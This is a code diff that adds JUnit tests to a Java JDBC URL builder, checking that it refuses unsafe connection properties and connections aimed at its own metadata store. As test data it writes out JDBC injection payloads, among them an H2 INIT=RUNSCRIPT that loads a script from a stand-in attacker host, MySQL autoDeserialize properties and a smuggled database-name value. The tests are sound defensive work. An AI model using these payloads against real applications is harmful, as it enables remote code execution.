@@ -1,6 +1,7 @@
 package com.qqmu.jync.service.connection;
 
 import static org.assertj.core.api.Assertions.assertThat;
+import static org.assertj.core.api.Assertions.assertThatThrownBy;
 
 import org.junit.jupiter.api.Test;
 
@@ -69,5 +70,103 @@ class DataSourceManagerJdbcUrlTest {
                 .startsWith("jdbc:mysql://h:3306/db");
         assertThat(manager.buildJdbcUrl(config(DatabaseType.ORACLE, "h", null)))
                 .isEqualTo("jdbc:oracle:thin:@//h:1521/db");
+    }
+
+    // —— URL 属性注入:黑名单必须覆盖 customUrl 与模板插值,不只是 extraParams ——
+
+    @Test
+    void aCustomUrlCarryingADangerousPropertyIsRefused() {
+        DatabaseConfig c = config(DatabaseType.MYSQL, "h", 3306);
+        c.setCustomUrl("jdbc:mysql://h/db?autoDeserialize=true&queryInterceptors=x");
+        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
+                .isInstanceOf(IllegalArgumentException.class)
+                .hasMessage("error.connection.url.unsafe");
+    }
+
+    @Test
+    void anH2InitRunscriptUrlIsRefused() {
+        DatabaseConfig c = config(DatabaseType.H2, "h", 9092);
+        c.setCustomUrl("jdbc:h2:mem:pwn;INIT=RUNSCRIPT FROM 'http://attacker/e.sql'");
+        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
+                .hasMessage("error.connection.url.unsafe");
+    }
+
+    @Test
+    void aDatabaseNameSmugglingAPropertyIsRefused() {
+        DatabaseConfig c = config(DatabaseType.H2, "h", 9092);
+        c.setDatabaseName("x;INIT=RUNSCRIPT FROM 'http://attacker/e.sql'");
+        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
+                .hasMessage("error.connection.url.unsafe");
+    }
+
+    @Test
+    void aConnectionPointingAtTheOwnMetadataStoreIsRefused() {
+        org.springframework.test.util.ReflectionTestUtils.setField(manager, "metadataUrl",
+                "jdbc:h2:file:./data/jync;MODE=MySQL;AUTO_SERVER=TRUE");
+        DatabaseConfig c = config(DatabaseType.H2, "h", 9092);
+        c.setCustomUrl("jdbc:h2:file:./data/jync;MODE=MySQL;AUTO_SERVER=TRUE");
+        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
+                .hasMessage("error.connection.url.selfMetadata");
+    }
+
+    @Test
+    void anOrdinaryCustomUrlStillPasses() {
+        DatabaseConfig c = config(DatabaseType.MYSQL, "h", 3306);
+        c.setCustomUrl("jdbc:mysql://h:3306/db?useSSL=false&serverTimezone=UTC");
+        assertThat(manager.buildJdbcUrl(c)).contains("jdbc:mysql://h:3306/db");
+    }
+
+    @Test
+    void aPercentEncodedDangerousKeyIsStillRefused() {
+        // Connector/J URL-decodes query keys, so %61utoDeserialize becomes autoDeserialize.
+        DatabaseConfig c = config(DatabaseType.MYSQL, "h", 3306);
+        c.setCustomUrl("jdbc:mysql://h/db?%61utoDeserialize=true");
+        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
+                .hasMessage("error.connection.url.unsafe");
+    }
+
+    @Test
+    void aLoopbackTcpUrlPointingAtTheOwnMetadataStoreIsRefused() {
+        org.springframework.test.util.ReflectionTestUtils.setField(manager, "metadataUrl",
+                "jdbc:h2:file:./data/jync;MODE=MySQL;AUTO_SERVER=TRUE");
+        DatabaseConfig c = config(DatabaseType.H2, "localhost", 9092);
+        c.setDatabaseName("./data/jync");   // the H2 preset builds tcp://localhost:9092/./data/jync
+        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
+                .hasMessage("error.connection.url.selfMetadata");
+    }
+
+    @Test
+    void aRemoteH2TcpConnectionIsNotMistakenForTheMetadataStore() {
+        org.springframework.test.util.ReflectionTestUtils.setField(manager, "metadataUrl",
+                "jdbc:h2:file:./data/jync;MODE=MySQL;AUTO_SERVER=TRUE");
+        DatabaseConfig c = config(DatabaseType.H2, "dbserver.example.com", 9092);
+        c.setDatabaseName("./data/jync");
+        assertThat(manager.buildJdbcUrl(c))
+                .contains("jdbc:h2:tcp://dbserver.example.com:9092/");
+    }
+
+    @Test
+    void anH2JavaObjectSerializerPropertyIsRefused() {
+        DatabaseConfig c = config(DatabaseType.H2, "h", 9092);
+        c.setCustomUrl("jdbc:h2:mem:x;JAVA_OBJECT_SERIALIZER=org.example.Evil");
+        assertThatThrownBy(() -> manager.buildJdbcUrl(c))
+                .hasMessage("error.connection.url.unsafe");
+    }
+
+    @Test
+    void aConfiguredSocketTimeoutIsAppendedPerDriver() {
+        SyncProperties props = new SyncProperties();
+        props.setJdbcSocketTimeoutMs(60_000);
+        DataSourceManager m = new DataSourceManager(null, null, props);
+        assertThat(m.buildJdbcUrl(config(DatabaseType.MYSQL, "h", 3306)))
+                .contains("socketTimeout=60000");          // Connector/J milliseconds
+        assertThat(m.buildJdbcUrl(config(DatabaseType.POSTGRESQL, "h", 5432)))
+                .contains("socketTimeout=60");            // pgjdbc seconds
+    }
+
+    @Test
+    void socketTimeoutIsOffByDefault() {
+        assertThat(manager.buildJdbcUrl(config(DatabaseType.MYSQL, "h", 3306)))
+                .doesNotContain("socketTimeout");
     }
 }
